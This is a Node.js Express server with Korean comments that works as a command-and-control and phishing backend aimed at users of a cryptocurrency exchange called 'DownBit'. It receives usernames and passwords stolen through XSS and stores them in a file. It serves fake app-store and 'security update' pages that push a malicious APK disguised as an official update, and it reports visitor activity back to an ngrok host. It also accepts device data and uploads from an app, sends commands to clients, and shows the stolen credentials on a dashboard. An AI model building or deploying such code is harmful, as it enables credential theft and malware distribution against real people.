const express = require('express');
const multer = require('multer');
const app = express();
const fs = require('fs');
const path = require('path');

// JSON 파싱
app.use(express.json());
app.use(express.text());

// 파일 업로드 설정
const upload = multer({ dest: 'uploads/' });

// CORS 허용 (중요!)
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
    res.header('Access-Control-Allow-Headers', 'Content-Type');
    next();
});

// 로그 파일들
const logFile = 'stolen_credentials.txt';
const appDataLog = 'app_data.txt';

// 🔴 XSS로 탈취한 계정 정보 수집
app.post('/steal', (req, res) => {
    const { id, pw } = req.body;
    const timestamp = new Date().toISOString();
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const ip = req.ip || req.connection.remoteAddress;
    
    console.log(`\n🔴 [${timestamp}] XSS 계정 정보 탈취:`);
    console.log('아이디:', id);
    console.log('비밀번호:', pw);
    console.log('IP:', ip);
    console.log('User-Agent:', userAgent);
    
    // 파일에 저장
    const logEntry = `
========================================
시간: ${timestamp}
IP: ${ip}
아이디: ${id}
비밀번호: ${pw}
User-Agent: ${userAgent}
========================================\n`;
    
    fs.appendFileSync(logFile, logEntry);
    
    res.json({ status: 'success' });
});

// 🔴 앱에서 오는 데이터 수집 (원래 기능)
app.post('/collect', (req, res) => {
    const data = req.body;
    const timestamp = new Date().toISOString();
    
    console.log(`\n📱 [${timestamp}] 앱 데이터 수신:`);
    console.log('Type:', data.type);
    console.log('Device:', data.device_id);
    console.log('Data:', data.data);
    
    // 파일에 저장
    const logEntry = `
========================================
시간: ${timestamp}
타입: ${data.type}
기기: ${data.device_id}
데이터: ${JSON.stringify(data.data, null, 2)}
========================================\n`;
    
    fs.appendFileSync(appDataLog, logEntry);
    
    res.json({ status: 'received' });
});

// 🔴 파일 업로드 엔드포인트 (원래 기능)
app.post('/upload', upload.single('file'), (req, res) => {
    const timestamp = new Date().toISOString();
    console.log(`📁 [${timestamp}] 파일 업로드:`, req.file);
    
    const logEntry = `[${timestamp}] 파일 업로드: ${req.file?.originalname} (${req.file?.size} bytes)\n`;
    fs.appendFileSync('file_uploads.log', logEntry);
    
    res.json({ status: 'uploaded', filename: req.file?.filename });
});

// 🔴 명령 전송 엔드포인트 (C&C - 원래 기능)
app.get('/commands', (req, res) => {
    // 악성 명령 전송
    const command = `
        alert('System Compromised!');
        // 추가 명령어들...
        console.log('C&C 서버에서 명령 수신');
    `;
    res.send(command);
});

// 가짜 플레이스토어 페이지
app.get('/store', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>DownBit Store</title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body {
                    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                    background: #f8f9fa;
                    color: #333;
                }
                .header {
                    background: #fff;
                    padding: 16px;
                    box-shadow: 0 2px 8px rgba(0,0,0,0.1);
                    display: flex;
                    align-items: center;
                }
                .header h1 {
                    color: #D32F2F;
                    font-size: 20px;
                    margin-left: 10px;
                }
                .app-detail {
                    background: #fff;
                    margin: 16px;
                    padding: 24px;
                    border-radius: 12px;
                    box-shadow: 0 2px 8px rgba(0,0,0,0.1);
                }
                .app-header {
                    display: flex;
                    margin-bottom: 24px;
                }
                .app-icon {
                    width: 80px;
                    height: 80px;
                    background: linear-gradient(135deg, #D32F2F, #B71C1C);
                    border-radius: 16px;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    margin-right: 16px;
                }
                .app-icon span {
                    color: white;
                    font-size: 36px;
                    font-weight: 900;
                }
                .app-info h2 {
                    font-size: 24px;
                    font-weight: 700;
                    margin-bottom: 4px;
                }
                .app-info .developer {
                    color: #666;
                    font-size: 14px;
                    margin-bottom: 8px;
                }
                .rating {
                    display: flex;
                    align-items: center;
                    margin-bottom: 8px;
                }
                .stars {
                    color: #FFC107;
                    margin-right: 8px;
                }
                .install-section {
                    margin: 24px 0;
                }
                .install-btn {
                    background: #4CAF50;
                    color: white;
                    border: none;
                    padding: 16px 48px;
                    border-radius: 8px;
                    font-size: 16px;
                    font-weight: 600;
                    cursor: pointer;
                    width: 100%;
                    margin-bottom: 12px;
                }
                .install-btn:hover {
                    background: #45a049;
                }
                .size-info {
                    color: #666;
                    font-size: 14px;
                    text-align: center;
                }
                .description {
                    margin-top: 24px;
                    line-height: 1.6;
                }
                .feature-list {
                    margin: 16px 0;
                    padding-left: 20px;
                }
                .feature-list li {
                    margin: 8px 0;
                    color: #555;
                }
                .security-badge {
                    background: #E8F5E8;
                    color: #2E7D32;
                    padding: 8px 12px;
                    border-radius: 20px;
                    display: inline-block;
                    font-size: 12px;
                    font-weight: 600;
                    margin: 16px 0;
                }
            </style>
        </head>
        <body>
            <div class="header">
                <div style="width: 24px; height: 24px; background: #D32F2F; border-radius: 4px; display: flex; align-items: center; justify-content: center;">
                    <span style="color: white; font-size: 14px; font-weight: 900;">D</span>
                </div>
                <h1>DownBit Store</h1>
            </div>

            <div class="app-detail">
                <div class="app-header">
                    <div class="app-icon">
                        <span>B</span>
                    </div>
                    <div class="app-info">
                        <h2>DownBit Security</h2>
                        <div class="developer">DownBit Inc.</div>
                        <div class="rating">
                            <span class="stars">★★★★★</span>
                            <span>4.8 (1,234 reviews)</span>
                        </div>
                        <div style="color: #666; font-size: 14px;">Finance • Security</div>
                    </div>
                </div>

                <div class="install-section">
                    <button class="install-btn" onclick="downloadApp()">
                        Install Security Update
                    </button>
                    <div class="size-info">12.4 MB • Version 2.1.8</div>
                </div>

                <div class="security-badge">
                    🔒 Verified by DownBit Security Team
                </div>

                <div class="description">
                    <h3>About this app</h3>
                    <p>Essential security update for DownBit cryptocurrency exchange. This update includes critical security patches and enhanced protection against recent threats.</p>
                    
                    <h4 style="margin-top: 20px;">What's new in this version:</h4>
                    <ul class="feature-list">
                        <li>Enhanced account security protocols</li>
                        <li>Improved anti-phishing protection</li>
                        <li>Updated encryption algorithms</li>
                        <li>Bug fixes and performance improvements</li>
                    </ul>

                    <h4 style="margin-top: 20px;">Requirements:</h4>
                    <p style="color: #666; font-size: 14px;">Android 7.0 and up • 50MB available space</p>
                </div>
            </div>

            <script>
                function downloadApp() {
                    // 다운로드 시작 표시
                    const btn = document.querySelector('.install-btn');
                    btn.innerHTML = '⬇ Downloading...';
                    btn.style.background = '#FF9800';
                    
                    // 실제 다운로드 실행
                    window.location.href = 'https://pleasing-humane-leopard.ngrok-free.app/download-apk';
                    
                    // 로그 전송
                    fetch('https://pleasing-humane-leopard.ngrok-free.app/log-access', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            action: 'store_download_clicked',
                            timestamp: new Date().toISOString(),
                            userAgent: navigator.userAgent
                        })
                    }).catch(e => console.log(e));
                    
                    // 3초 후 버튼 복구
                    setTimeout(() => {
                        btn.innerHTML = 'Install Security Update';
                        btn.style.background = '#4CAF50';
                    }, 3000);
                }
            </script>
        </body>
        </html>
    `);
});
app.get('/success', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>DownBit - 보안 업데이트</title>
            <style>
                * {
                    margin: 0;
                    padding: 0;
                    box-sizing: border-box;
                }
                body {
                    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                    background: linear-gradient(135deg, #D32F2F, #B71C1C);
                    min-height: 100vh;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    padding: 20px;
                }
                .container {
                    background: white;
                    border-radius: 20px;
                    padding: 40px 30px;
                    width: 100%;
                    max-width: 400px;
                    text-align: center;
                    box-shadow: 0 20px 60px rgba(0,0,0,0.3);
                }
                .logo {
                    width: 80px;
                    height: 80px;
                    background: linear-gradient(135deg, #D32F2F, #B71C1C);
                    border-radius: 50%;
                    margin: 0 auto 20px;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    box-shadow: 0 10px 30px rgba(211,47,47,0.3);
                }
                .logo span {
                    color: white;
                    font-size: 36px;
                    font-weight: 900;
                }
                h1 {
                    color: #D32F2F;
                    font-size: 24px;
                    font-weight: 700;
                    margin-bottom: 10px;
                }
                .subtitle {
                    color: #666;
                    font-size: 16px;
                    margin-bottom: 30px;
                    line-height: 1.4;
                }
                .update-box {
                    background: #f8f9fa;
                    border-radius: 15px;
                    padding: 25px;
                    margin-bottom: 25px;
                    border-left: 4px solid #D32F2F;
                }
                .update-title {
                    color: #D32F2F;
                    font-size: 18px;
                    font-weight: 700;
                    margin-bottom: 15px;
                }
                .update-text {
                    color: #333;
                    font-size: 14px;
                    line-height: 1.6;
                    margin-bottom: 20px;
                }
                .download-btn {
                    background: linear-gradient(135deg, #4CAF50, #388E3C);
                    color: white;
                    padding: 15px 30px;
                    border: none;
                    border-radius: 12px;
                    font-size: 16px;
                    font-weight: 700;
                    cursor: pointer;
                    width: 100%;
                    transition: all 0.2s;
                    box-shadow: 0 4px 15px rgba(76,175,80,0.3);
                }
                .download-btn:hover {
                    transform: translateY(-2px);
                    box-shadow: 0 6px 20px rgba(76,175,80,0.4);
                }
                .version-info {
                    color: #999;
                    font-size: 12px;
                    margin-top: 15px;
                }
                .warning {
                    background: #fff3cd;
                    border: 1px solid #ffeaa7;
                    border-radius: 8px;
                    padding: 15px;
                    margin-top: 20px;
                    color: #856404;
                    font-size: 13px;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="logo">
                    <span>B</span>
                </div>
                
                <h1>보안 인증 완료</h1>
                <p class="subtitle">안전한 거래를 위한 필수 보안 업데이트가 있습니다.</p>
                
                <div class="update-box">
                    <div class="update-title">🔒 보안 패치 v2.1.8</div>
                    <div class="update-text">
                        최근 발견된 보안 취약점을 해결하기 위한 긴급 업데이트입니다.<br><br>
                        • 계정 보안 강화<br>
                        • 거래 안전성 향상<br>
                        • 피싱 방지 시스템 개선<br><br>
                        <strong>지금 즉시 업데이트하여 계정을 안전하게 보호하세요.</strong>
                    </div>
                    
                    <button class="download-btn" onclick="goToStore()">
                        📱 보안 업데이트 다운로드
                    </button>
                    
                    <div class="version-info">
                        파일명: DownBit_Security_v2.1.8.apk<br>
                        크기: 12.4 MB | 버전: 2.1.8
                    </div>
                </div>
                
                <div class="warning">
                    ⚠️ 보안을 위해 24시간 내에 업데이트를 완료해주세요.
                </div>
            </div>
            
            <script>
                function goToStore() {
                    // 스토어 페이지로 이동 (브라우저에서 열림)
                    window.location.href = 'https://pleasing-humane-leopard.ngrok-free.app/store';
                }
                
                // 페이지 로드 시 로그 전송
                fetch('https://pleasing-humane-leopard.ngrok-free.app/log-access', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        action: 'success_page_viewed',
                        timestamp: new Date().toISOString(),
                        userAgent: navigator.userAgent
                    })
                }).catch(e => console.log(e));
            </script>
        </body>
        </html>
    `);
});

// APK 다운로드 엔드포인트
app.get('/download-apk', (req, res) => {
    const timestamp = new Date().toISOString();
    console.log(`📱 [${timestamp}] APK 다운로드 시도`);
    
    // 실제 APK 파일이 있다면
    const apkPath = path.join(__dirname, 'malicious.apk');
    if (fs.existsSync(apkPath)) {
        res.download(apkPath, 'DownBit_Security_v2.1.8.apk');
    } else {
        // APK 파일이 없을 때 더미 응답
        res.send(`
            <html>
            <head><title>다운로드 준비중</title></head>
            <body style="font-family: sans-serif; text-align: center; padding: 50px;">
                <h2>🔄 다운로드 준비중</h2>
                <p>보안 업데이트 파일을 준비하고 있습니다...</p>
                <p><small>잠시 후 자동으로 다운로드가 시작됩니다.</small></p>
            </body>
            </html>
        `);
    }
});

// 접근 로그 엔드포인트
app.post('/log-access', (req, res) => {
    const data = req.body;
    const timestamp = new Date().toISOString();
    
    console.log(`📊 [${timestamp}] 페이지 접근:`, data.action);
    
    const logEntry = `[${timestamp}] ${data.action} - ${data.userAgent}\n`;
    fs.appendFileSync('access.log', logEntry);
    
    res.json({ status: 'logged' });
});

// 대시보드
app.get('/dashboard', (req, res) => {
    const credentials = fs.existsSync(logFile) ? fs.readFileSync(logFile, 'utf8') : '데이터 없음';
    const accessLog = fs.existsSync('access.log') ? fs.readFileSync('access.log', 'utf8') : '로그 없음';
    
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>🎯 DownBit C2 Dashboard</title>
            <style>
                body { background: #000; color: #0F0; font-family: 'Courier New', monospace; padding: 20px; }
                h1 { color: #F00; text-align: center; animation: blink 1s infinite; }
                @keyframes blink { 50% { opacity: 0.5; } }
                .data-box { background: #111; border: 1px solid #0F0; padding: 20px; margin: 20px 0; border-radius: 5px; max-height: 400px; overflow-y: auto; }
                pre { white-space: pre-wrap; word-wrap: break-word; font-size: 12px; }
                .stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; margin: 20px 0; }
                .stat-card { background: #1a1a1a; border: 1px solid #0F0; padding: 15px; text-align: center; }
            </style>
            <meta http-equiv="refresh" content="10">
        </head>
        <body>
            <h1>🎯 DOWNBIT C&C DASHBOARD 🎯</h1>
            
            <div class="stats">
                <div class="stat-card">
                    <h3>🔴 XSS 피해자</h3>
                    <p style="font-size: 24px;">${credentials.split('========').length - 1}</p>
                </div>
                <div class="stat-card">
                    <h3>📱 앱 데이터</h3>
                    <p style="font-size: 24px;">${fs.existsSync(appDataLog) ? fs.readFileSync(appDataLog, 'utf8').split('========').length - 1 : 0}</p>
                </div>
                <div class="stat-card">
                    <h3>📊 총 접근</h3>
                    <p style="font-size: 24px;">${accessLog.split('\n').length - 1}</p>
                </div>
                <div class="stat-card">
                    <h3>📁 업로드 파일</h3>
                    <p style="font-size: 24px;">${fs.existsSync('file_uploads.log') ? fs.readFileSync('file_uploads.log', 'utf8').split('\n').length - 1 : 0}</p>
                </div>
                <div class="stat-card">
                    <h3>⏰ 서버 상태</h3>
                    <p style="font-size: 24px; color: #0F0;">ONLINE</p>
                </div>
            </div>
            
            <div class="data-box">
                <h2>🔑 XSS로 탈취된 계정</h2>
                <pre>${credentials}</pre>
            </div>
            
            <div class="data-box">
                <h2>📱 앱에서 수집된 데이터</h2>
                <pre>${fs.existsSync(appDataLog) ? fs.readFileSync(appDataLog, 'utf8') : '앱 데이터 없음'}</pre>
            </div>
            
            <div class="data-box">
                <h2>📋 접근 로그</h2>
                <pre>${accessLog}</pre>
            </div>
        </body>
        </html>
    `);
});

// 서버 시작
const PORT = 3000;
app.listen(PORT, () => {
    console.log(`
╔════════════════════════════════════════╗
║     🎯 DOWNBIT C&C SERVER STARTED      ║
╠════════════════════════════════════════╣
║  Server Port: ${PORT}                        ║
║  Dashboard: http://localhost:${PORT}/dashboard ║
║  Success Page: /success                ║
║  APK Download: /download-apk           ║
║  Steal Endpoint: /steal                ║
╚════════════════════════════════════════╝
    `);
});
